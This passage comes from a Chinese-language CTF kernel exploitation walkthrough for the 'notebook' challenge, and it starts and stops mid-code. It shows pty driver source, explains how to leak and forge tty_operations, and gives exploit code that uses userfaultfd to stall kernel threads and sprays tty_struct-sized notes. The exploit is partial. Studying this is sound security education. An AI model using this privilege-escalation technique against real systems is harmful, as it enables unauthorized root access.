&amp;ptm_unix98_ops);</span><br><span class="line"></span><br><span class="line">pts_driver-&gt;driver_name = <span class="string">&quot;pty_slave&quot;</span>;</span><br><span class="line">pts_driver-&gt;name = <span class="string">&quot;pts&quot;</span>;</span><br><span class="line">pts_driver-&gt;major = UNIX98_PTY_SLAVE_MAJOR;</span><br><span class="line">pts_driver-&gt;minor_start = <span class="number">0</span>;</span><br><span class="line">pts_driver-&gt;type = TTY_DRIVER_TYPE_PTY;</span><br><span class="line">pts_driver-&gt;subtype = PTY_TYPE_SLAVE;</span><br><span class="line">pts_driver-&gt;init_termios = tty_std_termios;</span><br><span class="line">pts_driver-&gt;init_termios.c_cflag = B38400 | CS8 | CREAD;</span><br><span class="line">pts_driver-&gt;init_termios.c_ispeed = <span class="number">38400</span>;</span><br><span class="line">pts_driver-&gt;init_termios.c_ospeed = <span class="number">38400</span>;</span><br><span class="line">pts_driver-&gt;other = ptm_driver;</span><br><span class="line">tty_set_operations(pts_driver, &amp;pty_unix98_ops);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (tty_register_driver(ptm_driver))</span><br><span class="line">panic(<span class="string">&quot;Couldn&#x27;t register Unix98 ptm driver&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (tty_register_driver(pts_driver))</span><br><span class="line">panic(<span class="string">&quot;Couldn&#x27;t register Unix98 pts driver&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now create the /dev/ptmx special device */</span></span><br><span class="line">tty_default_fops(&amp;ptmx_fops);</span><br><span class="line">ptmx_fops.open = ptmx_open;</span><br><span class="line"></span><br><span class="line">cdev_init(&amp;ptmx_cdev, &amp;ptmx_fops);</span><br><span class="line"><span class="keyword">if</span> (cdev_add(&amp;ptmx_cdev, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>) ||</span><br><span class="line">    register_chrdev_region(MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="number">1</span>, <span class="string">&quot;/dev/ptmx&quot;</span>) &lt; <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;Couldn&#x27;t register /dev/ptmx driver&quot;</span>);</span><br><span class="line">device_create(tty_class, <span class="literal">NULL</span>, MKDEV(TTYAUX_MAJOR, <span class="number">2</span>), <span class="literal">NULL</span>, <span class="string">&quot;ptmx&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到其中一共通过tty_alloc_driver函数分配了两个tty_operations结构体，这两个结构体的tty_operations被分别赋值为ptm_unix98_ops和pty_unix98_ops。这两个是静态常量，因此可以在vmlinux的符号表中找到，其地址与基址的差值固定：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">ptm_unix98_ops</span> =</span> &#123;</span><br><span class="line">.lookup = ptm_unix98_lookup,</span><br><span class="line">.install = pty_unix98_install,</span><br><span class="line">.remove = pty_unix98_remove,</span><br><span class="line">.open = pty_open,</span><br><span class="line">.close = pty_close,</span><br><span class="line">.write = pty_write,</span><br><span class="line">.write_room = pty_write_room,</span><br><span class="line">.flush_buffer = pty_flush_buffer,</span><br><span class="line">.chars_in_buffer = pty_chars_in_buffer,</span><br><span class="line">.unthrottle = pty_unthrottle,</span><br><span class="line">.ioctl = pty_unix98_ioctl,</span><br><span class="line">.compat_ioctl = pty_unix98_compat_ioctl,</span><br><span class="line">.resize = pty_resize,</span><br><span class="line">.cleanup = pty_cleanup,</span><br><span class="line">.show_fdinfo = pty_show_fdinfo,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> <span class="title">pty_unix98_ops</span> =</span> &#123;</span><br><span class="line">.lookup = pts_unix98_lookup,</span><br><span class="line">.install = pty_unix98_install,</span><br><span class="line">.remove = pty_unix98_remove,</span><br><span class="line">.open = pty_open,</span><br><span class="line">.close = pty_close,</span><br><span class="line">.write = pty_write,</span><br><span class="line">.write_room = pty_write_room,</span><br><span class="line">.flush_buffer = pty_flush_buffer,</span><br><span class="line">.chars_in_buffer = pty_chars_in_buffer,</span><br><span class="line">.unthrottle = pty_unthrottle,</span><br><span class="line">.set_termios = pty_set_termios,</span><br><span class="line">.start = pty_start,</span><br><span class="line">.stop = pty_stop,</span><br><span class="line">.cleanup = pty_cleanup,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在一个线程被阻塞时，我们可以通过read函数读取到tty_operations的地址值，通过最后12比特来确认这里的值是pty_unix98_ops还是ptm_unix98_ops。</p><p><strong>注意：tty_alloc_driver函数实际上调用的是__tty_alloc_driver这个函数，其中将tty_struct的magic字段赋值为TTY_DRIVER_MAGIC，值为0x5402（4.15.8版本内核，不同版本的值可能不同）。因此可以通过读取magic值判断这块内存是否被分配为tty_struct结构体。</strong></p><p>我们将tty_operations改为我们构造好的结构，但本题开启了SMP保护，不能直接写一个用户空间的内存地址。考虑到notegift函数能够为我们返回所有note的地址，因此可以考虑将tty_operations写在note里面。</p><h1 id="Step-11-exp编写——写好交互"><a href="#Step-11-exp编写——写好交互" class="headerlink" title="Step 11 exp编写——写好交互"></a>Step 11 exp编写——写好交互</h1><p>实现接口与提示性输出。<br>uffdexploit.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ROOTFS_UFFDEXPLOIT_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROOTFS_UFFDEXPLOIT_H</span></span><br><span class="line"><span class="type">static</span> <span class="type">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;31m[x] Error: %s\n\033[m&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为一块指定地址addr、大小len的内存空间注册缺页异常函数handler</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">registerUserFaultFd</span><span class="params">(<span class="type">void</span> * addr, <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">void</span>* (*handler)(<span class="type">void</span>*))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl((<span class="type">int</span>)uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="type">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ROOTFS_UFFDEXPLOIT_H</span></span></span><br></pre></td></tr></table></figure><p>exp.c（不完整）:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by root on 22-7-28.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;uffdexploit.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD_CODE 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GIFT_CODE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELETE_CODE 512</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT_CODE 768</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">notearg</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">void</span>* buf;</span><br><span class="line">&#125;notearg;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notebook_msg</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">noteadd</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdd note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    <span class="keyword">if</span>(size &lt;= <span class="number">0x60</span>)</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mAdding note which has size larger than 0x60, use edit...\n\033[m&quot;</span>);</span><br><span class="line">        arg.size = <span class="number">0x60</span>;</span><br><span class="line">        ioctl(fd, ADD_CODE, &amp;arg);</span><br><span class="line">        arg.size = size;</span><br><span class="line">        noteedit(idx, size, buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notegift</span><span class="params">(<span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;32mFetch note information...\n\033[m&quot;</span>);</span><br><span class="line">    notearg arg = &#123;<span class="number">0</span>, <span class="number">0</span>, buf&#125;;</span><br><span class="line">    ioctl(fd, GIFT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notedel</span><span class="params">(<span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mDelete note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    notearg arg = &#123;idx, <span class="number">0</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    ioctl(fd, DELETE_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">noteedit</span><span class="params">(<span class="type">size_t</span> idx, <span class="type">size_t</span> size, <span class="type">void</span>* buf)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mResize note #%zu to %zu...\n\033[m&quot;</span>, idx, size);</span><br><span class="line">    notearg arg = &#123;idx, size, buf&#125;;</span><br><span class="line">    ioctl(fd, EDIT_CODE, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notewrite</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* buf, <span class="type">size_t</span> idx)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mWrite to note #%zu...\n\033[m&quot;</span>, idx);</span><br><span class="line">    write(fd, buf, idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">notebook_msg</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> noteBuf[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    notegift(noteBuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;36m--------------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Current Notebook Info:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tNote #%2d: size = %zu, pointer = %p\n&quot;</span>, i, noteBuf[i*<span class="number">2</span>+<span class="number">1</span>], (<span class="type">char</span>*)noteBuf[i*<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------------\n\033[m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Step-12-exp编写——使userfaultfd成功阻塞主线程"><a href="#Step-12-exp编写——使userfaultfd成功阻塞主线程" class="headerlink" title="Step 12: exp编写——使userfaultfd成功阻塞主线程"></a>Step 12: exp编写——使userfaultfd成功阻塞主线程</h1><p>编译测试的时候别忘了加上-lpthread选项。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line">    page = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* mmap_space = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap executed, mmap address: %p\n\033[m&quot;</span>, mmap_space);</span><br><span class="line">    registerUserFaultFd(mmap_space, <span class="number">0x1000</span>, fault_handler_thread);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mMmap space userfaultfd registered.\n\033[m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">        noteadd(i, TTY_STRUCT_SIZE, page);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34mNotebook 